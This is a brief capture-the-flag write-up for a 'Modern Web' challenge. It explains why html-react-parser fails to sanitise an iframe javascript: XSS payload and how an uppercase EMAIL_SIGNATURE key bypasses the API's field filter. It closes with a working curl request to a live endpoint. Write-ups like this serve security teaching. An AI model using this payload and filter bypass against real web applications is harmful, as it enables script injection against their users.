# Modern Web CTF Solution

The main thing to realise is that it might seem like `html-react-parser` is used
to sanitise the HTML from the API, but it actually doesn't, at least not fully.
So `<script>alert(1)</script>` and `<img src=404 onerror=alert(1)/>` won't work,
but `<iframe src=javascript:alert(1)></iframe>` will.

TODO: Find other XSS payloads that work and figure out why this one does
https://github.com/remarkablemark/html-react-parser/blob/v0.6.2/lib/dom-to-react.js#L55-L62

If you include a value for `email_signature` in a POST to the API, the API
removes it. But the API "normalises" the input data by converting the keys to
lowercase, so you can bypass that by using `EMAIL_SIGNATURE` as the key instead.

```sh
curl 'https://1ucl257rci.execute-api.ap-southeast-2.amazonaws.com/dev/ctf' \
  -H 'content-type: application/json' \
  --data '{"job_title":"solution","phone_number":"13","EMAIL_SIGNATURE":"<iframe src=javascript:alert(1)></iframe>"}'
```
